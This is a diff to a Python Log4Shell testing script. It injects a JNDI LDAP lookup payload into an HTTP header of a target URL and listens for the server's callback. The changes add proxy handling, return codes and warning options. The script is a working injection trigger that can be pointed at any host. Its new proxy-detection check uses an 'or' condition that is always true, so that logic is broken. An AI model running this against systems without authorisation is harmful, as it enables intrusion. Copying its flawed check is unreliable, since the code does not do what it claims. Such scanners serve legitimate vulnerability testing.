@@ -46,6 +46,7 @@ import  string
 import  struct
 import  sys
 import  time
+import  urllib.request
 import  urllib3
 #------------------------------------------------------------------------------
 _                       = [
@@ -55,17 +56,28 @@ _                       = [
 ]
 #------------------------------------------------------------------------------
 PROGRAM                 = os.path.basename(sys.argv[0])
-VERSION                 = "1.2"
-REVISION                = "20211214-0"
-AUTHOR                  = "Morty (Morty's Creations"
+VERSION                 = "1.3"
+REVISION                = "20211215-0"
+AUTHOR                  = "Morty (Morty's Creations)"
 #------------------------------------------------------------------------------
 # GLOBALS / CONSTANTS
 #------------------------------------------------------------------------------
+#------------------------------------------------------------------------------
+RETVAL_NOT_VULNERABLE   = 0
+RETVAL_VULNERABLE       = 1
+RETVAL_NO_TEST          = 2
+RETVAL_TEST_FAILED      = 3
 #------------------------------------------------------------------------------
 NETWORK_DIR_LABELS      = {
   "Receive"             : " <-- ",
   "Send"                : " --> ",
 }
+#------------------------------------------------------------------------------
+PROXY_NONE              = {
+  "http"                : None,
+  "https"               : None,
+}
+#------------------------------------------------------------------------------
 #------------------------------------------------------------------------------
 def DATETIME_STRING()   :
   return(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
@@ -116,6 +128,8 @@ class TCPThread(Thread):
     
     self._timeout       = (timeout * 1000)
     self._searchString  = searchString
+    
+    self._portTestDone  = False
     
     self._result        = False
     
@@ -221,15 +235,20 @@ class TCPThread(Thread):
         # READABLE SOCKETS:
         if(rs == self._socket):
           # READABLE LISTENER (SERVER) SOCKET:
-          debug("Server Socket")
           (conn, addr) = rs.accept()
           self._clients[conn] = {
             "state"     : "init",
             "addr"      : ("%s:%d" % (addr[0], addr[1])),
             "conn"      : conn,
           }
-          debug("Received Connection on Port %d from %s:%d" % (
-                self._port, addr[0], addr[1]))
+          debug("Received Connection on Port %d from %s:%d%s" % (
+                self._port,
+                addr[0],
+                addr[1],
+                (" [CALLBACK_PORT_TEST_NOT_EXPLOIT]"
+                        if(not(self._portTestDone)) else "")))
+          if(not(self._portTestDone)):
+            self._portTestDone = True
           conn.setblocking(0)
           sockList.append(conn)
         else:
@@ -437,7 +456,7 @@ YYYY-MM-DD HH:MM:SS 255.255.255.255:32767 --> 255.255.255.255:32767
 def usage():
 
   print("\n%s v%s Rev%s\n%s\n" % (PROGRAM, VERSION, REVISION, AUTHOR))
-  print("Usage: %s [-erT] [-i|p|h|t <arg>] <url>" % (
+  print("Usage: %s [-erTWx] [-i|p|h|t <arg>] <url>" % (
         PROGRAM))
 
   print("""
@@ -453,6 +472,8 @@ OPTIONS:
   -H | --header         <hdr_name>  header name sent in exploit
   -t | --timeout        <timeout>   timeout for exploit in seconds
   -T | --skip-callback-test         skip reachability test [NOT RECOMMENDED!]
+  -x | --use-system-proxy           send exploit request via Proxy
+  -W | --disable-warnings           disable warnings [NOT RECOMMENDED!]
 
 """)  
 
@@ -478,6 +499,14 @@ NOTES / **DISCLAIMER**:
         a Port Map from the Externally-Facing IP / Port to the host
         running this script.
 
+  * RETURN VALUES:
+  
+      VALUE     TEST_STATUS         VULNERABLE
+      0         SUCCEEDED           NO
+      1         SUCCEEDED           YES
+      2         NOT PERFORMED       N/A             [Script Usage Only]
+      3         FAILED              N/A
+
   * Morty and Morty's Creations ASSUMES ZERO LIABILITY relating to the
     results obtained by this script.
     
@@ -485,14 +514,17 @@ NOTES / **DISCLAIMER**:
 
 """)
 
-  exit(2)
+  sys.exit(RETVAL_NO_TEST)
 
 #------------------------------------------------------------------------------
 
-def debug(msg):
+def debug(msg, file = sys.stderr):
 
   if(g_debug):
-    print(msg, file = sys.stderr)
+    print("%s [DEBUG] %s\n" % (
+                DATETIME_STRING(),
+                msg),
+            file = file)
 
 #------------------------------------------------------------------------------
 
@@ -523,7 +555,7 @@ def printStatus(action, file = sys.stderr, **kwargs):
 def errorexit(msg):
 
   print(msg, file = sys.stderr)
-  exit(1)
+  exit(RETVAL_TEST_FAILED)
 
 #------------------------------------------------------------------------------
 
@@ -553,6 +585,20 @@ WARNING! WARNING! WARNING! Skip Callback Test Specified!
 
 #------------------------------------------------------------------------------
 
+def proxyWarning():
+
+  print("""
+WARNING! WARNING! WARNING! System Proxy Set but NOT USED!
+
+  * A system proxy was detected, but the script is OVERRIDING IT!
+  * This can be overriden via the (-x or --use-system-proxy) option.
+  * Sending the Exploit Request via Proxy IS PERFECTLY VALID, but, of course,
+    can be troublesome for testing INTERNAL SYSTEMS.
+""")
+
+
+#------------------------------------------------------------------------------
+
 def exploitCBTest(exploitCBIP, exploitCBPort):
 
   ret   = False
@@ -574,12 +620,15 @@ def sendExploitedRequest(
         exploitHeaderName   = "X-Api-Version",
         exploitCBIP         = None,
         exploitCBPort       = 1389,
-        exploitCBUserData   = None):
+        exploitCBUserData   = None,
+        useProxy            = False):
 
   try:
     urllib3.disable_warnings()
   except:
     pass
+  
+  proxies   = (PROXY_NONE if(not(useProxy)) else urllib.request.getproxies())
 
   # ${jndi:ldap://${LDAP_HOST}:${LDAP_PORT}/${LDAP_USERDATA}}
 
@@ -604,7 +653,8 @@ def sendExploitedRequest(
       response = requests.get(
             ("%s://%s" % (proto, url)),
             verify      = False,
-            headers     = headers)
+            headers     = headers,
+            proxies     = proxies)
       ret["succeeded"]  = True
       ret["status"]     = response.status_code
       break
@@ -612,6 +662,26 @@ def sendExploitedRequest(
       ret["succeeded"]  = False
       if(WANT_EXCEPTIONS): raise
             
+  return(ret)
+
+#------------------------------------------------------------------------------
+
+def isSystemProxyEnabled():
+
+  ret = None
+  
+  try:
+    proxies = urllib.request.getproxies()
+    if((proxies != {}) or (proxies != PROXY_NONE)):
+      ret = True
+    else:
+      ret = False
+  except:
+    ret = None
+
+  debug("isSystemProxyEnabled: %s" % (
+        ("[DETECTION_FAILED]" if(ret is None) else (str(ret)))))
+  
   return(ret)
 
 #------------------------------------------------------------------------------
@@ -624,9 +694,10 @@ def main():
   global g_resultOnly
   
   ## Status Variables  
-  retval            = 1
+  retval            = RETVAL_TEST_FAILED
   cbOk              = None
   cbTestSkipped     = False
+  proxyEnabled      = False
 
   ## Option Initialization
   exploitOnly       = False
@@ -635,6 +706,8 @@ def main():
   exploitCBPort     = PORT_EXPLOIT_CB_DEF
   exploitCBUserData = None
   exploitCBTimeout  = TIMEOUT_EXPLOIT_CB
+  useProxy          = False
+  disableWarnings   = False
 
   ## Option Processing      BEGIN   ------------------------------------------
   for sig in [signal.SIGINT, signal.SIGTERM]:
@@ -644,7 +717,7 @@ def main():
       print("WARNING: Failed to trap Signal %d" % (sig), file = sys.stderr)
 
   try:
-    opts, args = getopt.getopt(sys.argv[1:], "hdeH:i:p:rT", \
+    opts, args = getopt.getopt(sys.argv[1:], "hdeH:i:p:rTxW", \
             [
             "help",
             "debug",
@@ -653,7 +726,9 @@ def main():
             "exploit-only",
             "header=",
             "result-only",
-            "skip-callback-test"
+            "skip-callback-test",
+            "use-system-proxy",
+            "disable-warnings",
             ])
   except getopt.GetoptError as err:
     _ = err       # Reserved for Future Use!
@@ -687,9 +762,12 @@ def main():
       except ValueError:
         errorexit("Invalid Callback Timeout Value: %s" % (a))
     elif(o in ("-T", "--skip-callback-test")):
-      exploitCBTestWarning()
       cbOk                  = True
       cbTestSkipped         = True
+    elif(o in ("-x", "--use-system-proxy")):
+      useProxy              = True
+    elif(o in ("-W", "--disable-warnings")):
+      disableWarnings       = True
     else:
       usage()
 
@@ -721,6 +799,11 @@ def main():
             port            = str(exploitCBPort))
     except:
       errorexit("Failed to start TCP Thread; Exiting...")
+  
+  if(not(useProxy)):
+    proxyEnabled = isSystemProxyEnabled()
+    if(proxyEnabled is None):
+      pass
 
   ## Test Setup             END     ------------------------------------------
   ## Test Validation        BEGIN   ------------------------------------------
@@ -750,7 +833,8 @@ def main():
         exploitHeaderName   = exploitHeaderName,
         exploitCBIP         = exploitCBIP,
         exploitCBPort       = exploitCBPort,
-        exploitCBUserData   = exploitCBUserData)
+        exploitCBUserData   = exploitCBUserData,
+        useProxy            = useProxy)
 
   printStatus(
         "Exploit HTTP Request Sent",
@@ -769,6 +853,8 @@ def main():
       try:
         g_tcpThread.join()
         exploitSucceeded = g_tcpThread.getResult()
+        retval           = (RETVAL_VULNERABLE if(exploitSucceeded)
+                else RETVAL_NOT_VULNERABLE)
       except InterruptedError:
         pass
       
@@ -781,7 +867,9 @@ def main():
                 url,
                 "NO_RESULT_USER_CANCELLED"))
 
-  if(cbTestSkipped): exploitCBTestWarning()
+  if(not(disableWarnings) and not(exploitSucceeded)):
+    if(cbTestSkipped):  exploitCBTestWarning()
+    if(proxyEnabled):   proxyWarning()
 
   ## Exploit Test           END     ------------------------------------------
 
